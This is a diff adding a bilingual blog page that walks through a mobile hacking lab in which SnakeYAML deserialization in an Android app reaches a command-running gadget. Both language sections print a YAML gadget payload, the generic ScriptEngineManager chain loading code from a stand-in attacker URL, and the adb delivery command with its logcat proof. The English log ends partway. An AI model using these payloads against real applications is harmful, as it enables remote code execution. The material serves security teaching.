@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Hacking Lab: Config Editor</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="shortcut icon" href="./assets/public/favicon.svg">
+    <style>
+        #articleContentVi pre,
+        #articleContentEn pre {
+            max-height: 560px;
+        }
+    </style>
+</head>
+<body class="blog-post-page">
+    <header class="head">
+        <div class="main">
+            <a href="./index.html" class="logo" aria-label="Phan Toan home">PHAN TOAN</a>
+            <ul class="menu">
+                <li class="btn" onclick="window.location.href='./index.html'">Home</li>
+                <li class="btn nav" onclick="window.location.href='./blog.html'">Blog</li>
+            </ul>
+            <ul class="menu" id="menu-expand">
+                <li class="btn skin" id="menu-expand-child" aria-label="Toggle navigation">
+                    <i class="icon menu-icon" aria-hidden="true"></i>
+                </li>
+            </ul>
+            <div id="menu-panel" hidden>
+                <ul class="menu-panel-content">
+                    <li class="btn" onclick="window.location.href='./index.html'">Home</li>
+                    <li class="btn nav" onclick="window.location.href='./blog.html'">Blog</li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <main class="blog blog-post-page-content">
+        <section class="hero-section hero-guide hero-guide-lab-config">
+            <div class="hero-overlay"></div>
+            <div class="hero-content">
+                <div class="hero-kicker">Mobile Pentest</div>
+                <h1 class="hero-title">Mobile Hacking Lab: Config Editor</h1>
+                <p class="hero-subtitle">
+                    Exported <code>VIEW</code> import, unsafe SnakeYAML deserialization, and the app-local gadget that maps a tagged scalar YAML node into <code>Runtime.exec()</code>.
+                </p>
+            </div>
+        </section>
+
+        <div class="blog-list">
+            <div class="item">
+                <div class="blog-post-meta-row">
+                    <div class="blog-tags">
+                        <a class="blog-tag" href="./blog.html?tag=pentest_mobile" data-tag="pentest_mobile">#pentest_mobile</a>
+                        <a class="blog-tag" href="./blog.html?tag=android" data-tag="android">#android</a>
+                        <a class="blog-tag" href="./blog.html?tag=rce" data-tag="rce">#rce</a>
+                        <a class="blog-tag" href="./blog.html?tag=deserialization" data-tag="deserialization">#deserialization</a>
+                    </div>
+
+                    <div class="info blog-meta">
+                        <div class="info-avatar"><img src="./assets/blog/avatar.svg" alt="Author avatar"></div>
+                        <div class="info-name">Phan Toan</div>
+                        <div class="info-time">2026-04-17</div>
+                    </div>
+                </div>
+
+                <div class="blog-post-layout">
+                    <article class="blog-markdown" id="articleContentVi" data-locale-panel="vi" hidden>
+                        <div class="article-locale-top">
+                            <div class="article-locale-switch" role="group" aria-label="Article language switcher">
+                                <button class="article-locale-btn" type="button" data-locale="vi" aria-pressed="false">VI</button>
+                                <button class="article-locale-btn active" type="button" data-locale="en" aria-pressed="true">EN</button>
+                            </div>
+                        </div>
+
+                        <h1 id="vi-overview">Mobile Hacking Lab: Config Editor</h1>
+                        <p>Lab này có thể được giải bằng cách nối chuỗi một điểm vào <code>VIEW</code> đã export với unsafe SnakeYAML deserialization.</p>
+                        <p>Ở mức cao, ứng dụng chấp nhận một tài nguyên YAML từ bên ngoài, tải nó xuống, sau đó parse nó bằng <code>SnakeYAML</code> với constructor mặc định permissive. Vì APK cũng chứa một local gadget class nguy hiểm, YAML do attacker kiểm soát có thể được biến thành command execution trực tiếp.</p>
+                        <p>Bài writeup này giải thích cách CVE-2022-1471 dẫn tới root cause chính xác trong ứng dụng này, dữ liệu chạy qua app như thế nào, và vì sao payload riêng của lab này đơn giản hơn nhiều so với payload <code>ScriptEngineManager</code> tổng quát thường được nhắc đến trong các bài viết công khai.</p>
+
+                        <h2 id="vi-cve">1. Bắt đầu từ CVE-2022-1471</h2>
+                        <p>CVE-2022-1471 là lỗ hổng unsafe deserialization kinh điển của SnakeYAML. Bài học quan trọng từ CVE này không nằm ở một magic payload duy nhất, mà nằm ở một mẫu thiết kế nguy hiểm:</p>
+                        <ul>
+                            <li>untrusted YAML đi tới <code>Yaml.load(...)</code></li>
+                            <li>SnakeYAML chấp nhận Java type tag do attacker kiểm soát</li>
+                            <li>parser instantiate Java class trong quá trình deserialization</li>
+                            <li>một class reachable trên classpath có side effect nguy hiểm</li>
+                            <li>việc tạo object trở thành code execution</li>
+                        </ul>
+                        <p>Vì vậy khi audit APK này, câu hỏi đúng không phải là “Nó có dùng chính xác payload công khai của CVE hay không?” mà là:</p>
+                        <ul>
+                            <li>App có parse attacker-controlled YAML không?</li>
+                            <li>App có dùng SnakeYAML theo cách không an toàn không?</li>
+                            <li>Trên classpath của app có gadget phù hợp không?</li>
+                        </ul>
+                        <p>Trong lab này, cả ba câu trả lời đều là có.</p>
+
+                        <h2 id="vi-recon">2. Dò tìm bề mặt tấn công</h2>
+                        <h3>Exported entry point</h3>
+                        <p><code>MainActivity</code> được export và chấp nhận <code>VIEW</code> intent cho YAML từ các nguồn <code>file</code>, <code>http</code>, và <code>https</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-8.png" alt="MainActivity accepts YAML VIEW intents from file, http, and https sources">
+                        </figure>
+                        <p>Chỉ riêng điều này đã tạo ra một bề mặt delivery cho attacker.</p>
+
+                        <h3>Luồng tải từ xa</h3>
+                        <p>App chuyển <code>Uri</code> đầu vào thành <code>URL</code> và tải nó về. Đối với tài nguyên từ xa, nó dùng <code>HttpURLConnection</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-9.png" alt="The app converts the incoming Uri into a URL">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-10.png" alt="HttpURLConnection downloads the remote YAML resource">
+                        </figure>
+                        <p>App cũng cho phép cleartext traffic:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-11.png" alt="The app permits cleartext traffic">
+                        </figure>
+                        <p>Điều này giúp việc test trên emulator trở nên đơn giản với <code>http://10.0.2.2:8686/...</code> <em>(host của máy tôi)</em>.</p>
+
+                        <h2 id="vi-root-cause">3. Nguyên nhân gốc</h2>
+                        <p>Nguyên nhân gốc là unsafe deserialization trên attacker-controlled YAML.</p>
+                        <p>Trong <code>MainActivity.loadYaml()</code>, app tạo SnakeYAML bằng <code>new Yaml(dumperOptions)</code> và lập tức gọi <code>yaml.load(inputStream)</code> trên input bên ngoài:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-12.png" alt="MainActivity.loadYaml reaches yaml.load(inputStream) on untrusted input">
+                        </figure>
+                        <p>Chi tiết quan trọng ở đây là <code>Yaml(DumperOptions)</code> <strong>không</strong> tạo ra safe parser. Trong source tree này, nó vẫn tạo default SnakeYAML <code>Constructor</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-13.png" alt="Yaml with DumperOptions still creates the default SnakeYAML constructor">
+                        </figure>
+                        <p>Vì vậy, mẫu code dễ bị tổn thương là:</p>
+                        <pre><code class="language-java">Yaml yaml = new Yaml(dumperOptions);
+Object deserializedData = yaml.load(inputStream);</code></pre>
+
+                        <h2 id="vi-danger">4. Vì sao SnakeYAML nguy hiểm trong trường hợp này</h2>
+                        <h3>Tag-controlled class resolution</h3>
+                        <p>SnakeYAML cho phép YAML tag đại diện cho tên Java class.</p>
+                        <p>Khi deserialize một object được gắn tag, nó resolve class từ tag đó và nạp nó bằng <code>Class.forName(...)</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-14.png" alt="SnakeYAML resolves a Java class name from the tag">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-15.png" alt="SnakeYAML loads the resolved class reflectively">
+                        </figure>
+                        <p>Nội bộ SnakeYAML dùng namespace <code>tag:yaml.org,2002:</code> cho các tag:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-16.png" alt="Internal SnakeYAML tag namespace handling">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-17.png" alt="Additional internal tag handling inside SnakeYAML">
+                        </figure>
+
+                        <h3>Scalar-node constructor invocation</h3>
+                        <p>Scalar node là một giá trị YAML không có cấu trúc lồng nhau, ví dụ như string, number, hoặc boolean.</p>
+                        <p>SnakeYAML model nó thành <code>ScalarNode</code> với <code>NodeId.scalar</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-18.png" alt="ScalarNode representation in SnakeYAML">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-19.png" alt="NodeId.scalar path in SnakeYAML">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-20.png" alt="Tagged scalar node path during deserialization">
+                        </figure>
+                        <p>Với tagged scalar node, SnakeYAML sử dụng <code>ConstructScalar</code> và tìm constructor một tham số:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-21.png" alt="ConstructScalar is used for tagged scalar nodes">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-22.png" alt="One-argument constructor lookup during scalar instantiation">
+                        </figure>
+                        <p>Đây là một sự khớp hoàn hảo với gadget có sẵn trong APK.</p>
+
+                        <h2 id="vi-gadget">5. Gadget riêng của lab này</h2>
+                        <p>APK chứa một local gadget class:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-23.png" alt="The local gadget class LegacyCommandUtil in the APK">
+                        </figure>
+                        <p>Constructor của nó là:</p>
+                        <pre><code class="language-java">public LegacyCommandUtil(String command) throws IOException {
+    Runtime.getRuntime().exec(command);
+}</code></pre>
+                        <p>Điều này có nghĩa là một tagged scalar YAML object có thể map trực tiếp thành:</p>
+                        <pre><code class="language-text">LegacyCommandUtil(String command)
+-> Runtime.exec(command)</code></pre>
+                        <p>Đó là lý do exploit riêng của lab này đơn giản hơn nhiều so với các payload công khai tổng quát của CVE.</p>
+
+                        <h2 id="vi-flow">6. Luồng dữ liệu đầu-cuối</h2>
+                        <p>Luồng đầy đủ trong lab này là:</p>
+                        <pre><code class="language-text">Attacker-controlled URL
+-> VIEW intent
+-> MainActivity.handleIntent()
+-> CopyUtil.copyFileFromUri()
+-> HttpURLConnection downloads YAML
+-> MainActivity.loadYaml()
+-> SnakeYAML Yaml.load()
+-> resolve explicit Java tag
+-> instantiate LegacyCommandUtil(String)
+-> Runtime.exec()
+-> RCE</code></pre>
+                        <p>Đi từng bước:</p>
+                        <p>1. <code>MainActivity.onCreate()</code> gọi <code>handleIntent()</code>.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-25.png" alt="MainActivity.onCreate calls handleIntent">
+                        </figure>
+                        <p>2. <code>handleIntent()</code> đọc <code>VIEW</code> intent đầu vào và truyền URI sang <code>CopyUtil.copyFileFromUri(data)</code>.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-26.png" alt="handleIntent passes the incoming URI to CopyUtil.copyFileFromUri">
+                        </figure>
+                        <p>3. <code>CopyUtil</code> tải YAML và lưu nó local.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-27.png" alt="CopyUtil starts the remote-to-local YAML copy flow">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-28.png" alt="CopyUtil stores the downloaded YAML locally">
+                        </figure>
+                        <p>4. Observer gọi <code>loadYaml(uri)</code> trên file vừa tải về.</p>
+                        <p>5. <code>loadYaml()</code> gọi <code>yaml.load(inputStream)</code> và quá trình deserialization bắt đầu.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-29.png" alt="loadYaml starts YAML deserialization">
+                        </figure>
+                        <p>6. SnakeYAML resolve explicit Java tag và instantiate gadget.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-30.png" alt="SnakeYAML resolves the explicit Java tag">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-31.png" alt="SnakeYAML instantiates LegacyCommandUtil from the tagged scalar node">
+                        </figure>
+                        <p>7. Constructor của gadget thực thi command được cung cấp.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-32.png" alt="Runtime.exec is reached from the gadget constructor">
+                        </figure>
+
+                        <h2 id="vi-script-engine">7. Vì sao không cần payload ScriptEngineManager tổng quát</h2>
+                        <p>Các writeup công khai về CVE-2022-1471 thường dùng các payload như:</p>
+                        <pre><code class="language-yaml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker/"]
+  ]]
+]</code></pre>
+                        <p>Payload đó là một JDK gadget chain tổng quát. Nó dựa vào class loading và service/provider discovery behavior.</p>
+                        <p>Lab này dễ hơn vì chính APK đã chứa một direct gadget:</p>
+                        <pre><code class="language-text">YAML tag -> LegacyCommandUtil(String) -> exec()</code></pre>
+                        <p>Không cần đến indirect JDK gadget.</p>
+
+                        <h2 id="vi-payload">8. Thiết kế payload cho lab này</h2>
+                        <h3>Payload kiểm tra parse</h3>
+                        <p>Một payload YAML vô hại có thể được dùng để xác minh luồng tải và parse: <code>payload-check.yml</code></p>
+                        <pre><code class="language-yaml">name: test
+value: 123
+items:
+  - one
+  - two
+meta:
+  source: local-host-8686
+  purpose: verify-download-and-parse</code></pre>
+
+                        <h3>Payload thực thi command</h3>
+                        <p>Payload đơn giản nhất đã được xác nhận trước đó là bản log-based proof:</p>
+                        <p><code>payload-rce-log.yml</code></p>
+                        <pre><code class="language-yaml">!!com.mobilehackinglab.configeditor.LegacyCommandUtil "/system/bin/log -t RCE_POC reached"</code></pre>
+                        <p>Dạng này phù hợp với lab vì:</p>
+                        <ul>
+                            <li>nó dùng đúng app-local gadget thật sự</li>
+                            <li>nó tránh shell metacharacters và redirection</li>
+                            <li>nó fit tốt với <code>Runtime.exec(String)</code></li>
+                            <li>nó để lại một file artifact có thể kiểm tra trên thiết bị</li>
+                        </ul>
+
+                        <h2 id="vi-validation">9. Xác minh thực tế</h2>
+                        <p>Luồng khai thác đã được xác minh qua hai giai đoạn.</p>
+
+                        <h3>Giai đoạn 1: Delivery và parsing</h3>
+                        <p><code>payload-check.yml</code> được load qua remote <code>VIEW</code> path và hiển thị đúng trong UI. Điều đó xác nhận:</p>
+                        <ul>
+                            <li><code>VIEW</code> intent route hoạt động</li>
+                            <li>emulator có thể truy cập host qua <code>10.0.2.2:8686</code></li>
+                            <li>app tải file thành công</li>
+                            <li><code>loadYaml()</code> và <code>yaml.load()</code> đã được gọi</li>
+                        </ul>
+
+                        <h3>Giai đoạn 2: Command execution</h3>
+                        <p>Sau đó, một gadget payload dùng <code>LegacyCommandUtil</code> được load và tạo ra bằng chứng log như sau:</p>
+                        <pre><code class="language-commandline">adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://10.0.2.2:8686/payload-rce.yml" -t "application/yaml"</code></pre>
+                        <p>Check <code>adb logcat</code>:</p>
+                        <pre><code class="language-commandline">04-17 13:36:07.373   566  1803 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=http://10.0.2.2:8686/... typ=application/yaml flg=0x10000000 cmp=com.mobilehackinglab.configeditor/.MainActivity} from uid 0
+04-17 13:36:07.385   566  1482 W ActivityTaskManager: Tried to set launchTime (0) < mLastActivityLaunchTime (16823541)
+04-17 13:36:07.473   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f3438000 0x3f3e1c000]
+04-17 13:36:07.483   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f73ec000 0x3f7dd0000]
+04-17 13:36:07.490   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f54d9000 0x3f5ebd000]
+04-17 13:36:07.543   566   592 I ActivityTaskManager: Displayed com.mobilehackinglab.configeditor/.MainActivity: +169ms
+04-17 13:36:07.562  8655  8674 D EGL_emulation: app_time_stats: avg=3253.92ms min=1.78ms max=35050.13ms count=11
+04-17 13:36:07.580  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onFinishInput():3420
+04-17 13:36:07.581  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onStartInput():2002
+04-17 13:36:07.582  1344  1344 I DeviceUnlockedTag: DeviceUnlockedTag.notifyDeviceLockStatusChanged():31 Notify device unlocked.
+04-17 13:36:07.984   566  1803 D AutofillSession: Set the response has expired.
+04-17 13:36:08.399  8960  8960 I RCE_POC : reached</code></pre>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-33.png" alt="Logcat evidence that confirms command execution">
+                        </figure>
+                        <p>Điều đó xác nhận:</p>
+                        <ul>
+                            <li>SnakeYAML đã chấp nhận explicit Java tag</li>
+                            <li>tagged scalar node đã được map thành <code>LegacyCommandUtil(String)</code></li>
+                            <li><code>Runtime.getRuntime().exec(...)</code> đã được gọi thành công</li>
+                        </ul>
+
+                        <h2 id="vi-conclusion">10. Kết luận</h2>
+                        <p>Nguyên nhân gốc của lab này là unsafe SnakeYAML deserialization trên attacker-controlled YAML.</p>
+                        <p>Đường khai thác rất thẳng vì APK chứa một local gadget lý tưởng. Attacker chỉ cần đưa một tagged scalar YAML object tới <code>yaml.load(...)</code>, và SnakeYAML sẽ làm phần còn lại:</p>
+                        <pre><code class="language-text">Untrusted YAML
+-> explicit Java tag
+-> class resolution
+-> constructor invocation
+-> Runtime.exec()</code></pre>
+                        <p>Điều quan trọng nhất cần rút ra là phần nguy hiểm không chỉ nằm ở việc load YAML từ một nguồn bên ngoài. Vấn đề thật sự là việc cho phép untrusted YAML điều khiển Java type resolution trong quá trình deserialization.</p>
+                    </article>
+
+                    <article class="blog-markdown" id="articleContentEn" data-locale-panel="en">
+                        <div class="article-locale-top">
+                            <div class="article-locale-switch" role="group" aria-label="Article language switcher">
+                                <button class="article-locale-btn" type="button" data-locale="vi" aria-pressed="false">VI</button>
+                                <button class="article-locale-btn active" type="button" data-locale="en" aria-pressed="true">EN</button>
+                            </div>
+                        </div>
+
+                        <h1 id="en-overview">Mobile Hacking Lab: Config Editor</h1>
+                        <p>This lab can be solved by chaining an exported <code>VIEW</code> entry point with unsafe SnakeYAML deserialization.</p>
+                        <p>At a high level, the application accepts an external YAML resource, downloads it, and then parses it with <code>SnakeYAML</code> using a permissive default constructor. Because the APK also contains a dangerous local gadget class, attacker-controlled YAML can be turned into direct command execution.</p>
+                        <p>This writeup explains how CVE-2022-1471 leads us to the exact root cause in this application, how the data flows through the app, and why the lab-specific payload is much simpler than the generic <code>ScriptEngineManager</code> payload often shown in public writeups.</p>
+
+                        <h2 id="en-cve">1. Starting From CVE-2022-1471</h2>
+                        <p>CVE-2022-1471 is the canonical SnakeYAML unsafe deserialization issue. The key lesson from that CVE is not a single magic payload, but a dangerous design pattern:</p>
+                        <ul>
+                            <li>untrusted YAML reaches <code>Yaml.load(...)</code></li>
+                            <li>SnakeYAML accepts attacker-controlled Java type tags</li>
+                            <li>the parser instantiates Java classes during deserialization</li>
+                            <li>a reachable class on the classpath has dangerous side effects</li>
+                            <li>object creation becomes code execution</li>
+                        </ul>
+                        <p>So when auditing this APK, the right question is not “Does it use the exact public CVE payload?” but:</p>
+                        <ul>
+                            <li>Does the app parse attacker-controlled YAML?</li>
+                            <li>Does it use unsafe SnakeYAML construction?</li>
+                            <li>Is there any suitable gadget on the app classpath?</li>
+                        </ul>
+                        <p>In this lab, the answer to all three is yes.</p>
+
+                        <h2 id="en-recon">2. Attack Surface Recon</h2>
+                        <h3>Exported entry point</h3>
+                        <p><code>MainActivity</code> is exported and accepts <code>VIEW</code> intents for YAML from <code>file</code>, <code>http</code>, and <code>https</code> sources:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-8.png" alt="MainActivity accepts YAML VIEW intents from file, http, and https sources">
+                        </figure>
+                        <p>This already gives the attacker a delivery surface.</p>
+
+                        <h3>Remote fetch path</h3>
+                        <p>The app converts the incoming <code>Uri</code> into a <code>URL</code> and downloads it. For remote resources it uses <code>HttpURLConnection</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-9.png" alt="The app converts the incoming Uri into a URL">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-10.png" alt="HttpURLConnection downloads the remote YAML resource">
+                        </figure>
+                        <p>The app also permits cleartext traffic:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-11.png" alt="The app permits cleartext traffic">
+                        </figure>
+                        <p>That makes emulator testing straightforward via <code>http://10.0.2.2:8686/...</code> <em>(My devices host)</em>.</p>
+
+                        <h2 id="en-root-cause">3. Root Cause</h2>
+                        <p>The root cause is unsafe deserialization of attacker-controlled YAML.</p>
+                        <p>In <code>MainActivity.loadYaml()</code>, the app creates SnakeYAML with <code>new Yaml(dumperOptions)</code> and immediately calls <code>yaml.load(inputStream)</code> on external input:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-12.png" alt="MainActivity.loadYaml reaches yaml.load(inputStream) on untrusted input">
+                        </figure>
+                        <p>The important detail is that <code>Yaml(DumperOptions)</code> does <strong>not</strong> create a safe parser. In this source tree it still creates a default SnakeYAML <code>Constructor</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-13.png" alt="Yaml with DumperOptions still creates the default SnakeYAML constructor">
+                        </figure>
+                        <p>So the vulnerable pattern is:</p>
+                        <pre><code class="language-java">Yaml yaml = new Yaml(dumperOptions);
+Object deserializedData = yaml.load(inputStream);</code></pre>
+
+                        <h2 id="en-danger">4. Why SnakeYAML Is Dangerous Here</h2>
+                        <h3>Tag-controlled class resolution</h3>
+                        <p>SnakeYAML allows YAML tags to represent Java class names.</p>
+                        <p>When deserializing a tagged object, it resolves the class from the tag and loads it with <code>Class.forName(...)</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-14.png" alt="SnakeYAML resolves a Java class name from the tag">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-15.png" alt="SnakeYAML loads the resolved class reflectively">
+                        </figure>
+                        <p>SnakeYAML tags use the <code>tag:yaml.org,2002:</code> namespace internally:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-16.png" alt="Internal SnakeYAML tag namespace handling">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-17.png" alt="Additional internal tag handling inside SnakeYAML">
+                        </figure>
+
+                        <h3>Scalar-node constructor invocation</h3>
+                        <p>A scalar node is a YAML value with no nested structure, such as a string, number, or boolean.</p>
+                        <p>SnakeYAML models this as <code>ScalarNode</code> with <code>NodeId.scalar</code>:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-18.png" alt="ScalarNode representation in SnakeYAML">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-19.png" alt="NodeId.scalar path in SnakeYAML">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-20.png" alt="Tagged scalar node path during deserialization">
+                        </figure>
+                        <p>For tagged scalar nodes, SnakeYAML uses <code>ConstructScalar</code> and looks for a one-argument constructor:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-21.png" alt="ConstructScalar is used for tagged scalar nodes">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-22.png" alt="One-argument constructor lookup during scalar instantiation">
+                        </figure>
+                        <p>This is a perfect match for the gadget in the APK.</p>
+
+                        <h2 id="en-gadget">5. The Lab-Specific Gadget</h2>
+                        <p>The APK contains a local gadget class:</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-23.png" alt="The local gadget class LegacyCommandUtil in the APK">
+                        </figure>
+                        <p>Its constructor is:</p>
+                        <pre><code class="language-java">public LegacyCommandUtil(String command) throws IOException {
+    Runtime.getRuntime().exec(command);
+}</code></pre>
+                        <p>This means a tagged scalar YAML object can directly map to:</p>
+                        <pre><code class="language-text">LegacyCommandUtil(String command)
+-> Runtime.exec(command)</code></pre>
+                        <p>That is why the lab-specific exploit is much simpler than the generic public CVE payloads.</p>
+
+                        <h2 id="en-flow">6. End-to-End Data Flow</h2>
+                        <p>The full flow in this lab is:</p>
+                        <pre><code class="language-text">Attacker-controlled URL
+-> VIEW intent
+-> MainActivity.handleIntent()
+-> CopyUtil.copyFileFromUri()
+-> HttpURLConnection downloads YAML
+-> MainActivity.loadYaml()
+-> SnakeYAML Yaml.load()
+-> resolve explicit Java tag
+-> instantiate LegacyCommandUtil(String)
+-> Runtime.exec()
+-> RCE</code></pre>
+                        <p>Step by step:</p>
+                        <p>1. <code>MainActivity.onCreate()</code> calls <code>handleIntent()</code>.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-25.png" alt="MainActivity.onCreate calls handleIntent">
+                        </figure>
+                        <p>2. <code>handleIntent()</code> reads the incoming <code>VIEW</code> intent and passes the URI to <code>CopyUtil.copyFileFromUri(data)</code>.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-26.png" alt="handleIntent passes the incoming URI to CopyUtil.copyFileFromUri">
+                        </figure>
+                        <p>3. <code>CopyUtil</code> downloads the YAML and stores it locally.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-27.png" alt="CopyUtil starts the remote-to-local YAML copy flow">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-28.png" alt="CopyUtil stores the downloaded YAML locally">
+                        </figure>
+                        <p>4. The observer calls <code>loadYaml(uri)</code> on the downloaded file.</p>
+                        <p>5. <code>loadYaml()</code> calls <code>yaml.load(inputStream)</code> and deserialization begins.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-29.png" alt="loadYaml starts YAML deserialization">
+                        </figure>
+                        <p>6. SnakeYAML resolves the explicit Java tag and instantiates the gadget.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-30.png" alt="SnakeYAML resolves the explicit Java tag">
+                        </figure>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-31.png" alt="SnakeYAML instantiates LegacyCommandUtil from the tagged scalar node">
+                        </figure>
+                        <p>7. The gadget constructor executes the supplied command.</p>
+                        <figure>
+                            <img src="./assets/public/mobile_hacking/image-32.png" alt="Runtime.exec is reached from the gadget constructor">
+                        </figure>
+
+                        <h2 id="en-script-engine">7. Why The Generic ScriptEngineManager Payload Is Not Needed Here</h2>
+                        <p>Public CVE-2022-1471 writeups often use payloads such as:</p>
+                        <pre><code class="language-yaml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker/"]
+  ]]
+]</code></pre>
+                        <p>That payload is a generic JDK gadget chain. It relies on class loading and service/provider discovery behavior.</p>
+                        <p>This lab is easier because the APK itself already contains a direct gadget:</p>
+                        <pre><code class="language-text">YAML tag -> LegacyCommandUtil(String) -> exec()</code></pre>
+                        <p>No indirect JDK gadget is necessary.</p>
+
+                        <h2 id="en-payload">8. Payload Design For This Lab</h2>
+                        <h3>Parse-check payload</h3>
+                        <p>A harmless YAML payload can be used to verify the download and parse path: <code>payload-check.yml</code></p>
+                        <pre><code class="language-yaml">name: test
+value: 123
+items:
+  - one
+  - two
+meta:
+  source: local-host-8686
+  purpose: verify-download-and-parse</code></pre>
+
+                        <h3>Command-execution payload</h3>
+                        <p>The simplest confirmed payload was a log-based proof:</p>
+                        <p><code>payload-rce-log.yml</code></p>
+                        <pre><code class="language-yaml">!!com.mobilehackinglab.configeditor.LegacyCommandUtil "/system/bin/log -t RCE_POC reached"</code></pre>
+                        <p>This form is preferable for the lab because:</p>
+                        <ul>
+                            <li>it uses the actual app-local gadget</li>
+                            <li>it avoids shell metacharacters and redirection</li>
+                            <li>it fits <code>Runtime.exec(String)</code> cleanly</li>
+                            <li>it leaves a file artifact that can be checked on-device</li>
+                        </ul>
+
+                        <h2 id="en-validation">9. Practical Validation</h2>
+                        <p>The exploitation path was validated in two stages.</p>
+
+                        <h3>Stage 1: Delivery and parsing</h3>
+                        <p><code>payload-check.yml</code> was loaded through the remote <code>VIEW</code> path and displayed correctly in the UI. That confirmed:</p>
+                        <ul>
+                            <li>the <code>VIEW</code> intent route works</li>
+                            <li>the emulator can reach the host via <code>10.0.2.2:8686</code></li>
+                            <li>the app downloads the file successfully</li>
+                            <li><code>loadYaml()</code> and <code>yaml.load()</code> are reached</li>
+                        </ul>
+
+                        <h3>Stage 2: Command execution</h3>
+                        <p>A gadget payload using <code>LegacyCommandUtil</code> was then loaded and produced the following log evidence:</p>
+                        <pre><code class="language-commandline">adb shell am start -n com.mobilehackinglab.configeditor/.MainActivity -a android.intent.action.VIEW -d "http://10.0.2.2:8686/payload-rce.yml" -t "application/yaml"</code></pre>
+                        <p>Check <code>adb logcat</code>:</p>
+                        <pre><code class="language-commandline">04-17 13:36:07.373   566  1803 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=http://10.0.2.2:8686/... typ=application/yaml flg=0x10000000 cmp=com.mobilehackinglab.configeditor/.MainActivity} from uid 0
+04-17 13:36:07.385   566  1482 W ActivityTaskManager: Tried to set launchTime (0) < mLastActivityLaunchTime (16823541)
+04-17 13:36:07.473   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f3438000 0x3f3e1c000]
+04-17 13:36:07.483   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f73ec000 0x3f7dd0000]
+04-17 13:36:07.490   369   409 D goldfish-address-space: claimShared: Ask to claim region [0x3f54d9000 0x3f5ebd000]
+04-17 13:36:07.543   566   592 I ActivityTaskManager: Displayed com.mobilehackinglab.configeditor/.MainActivity: +169ms
+04-17 13:36:07.562  8655  8674 D EGL_emulation: app_time_stats: avg=3253.92ms min=1.78ms max=35050.13ms count=11
+04-17 13:36:07.580  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onFinishInput():3420
+04-17 13:36:07.581  1344  1344 I GoogleInputMethodService: GoogleInputMethodService.onStartInput():2002
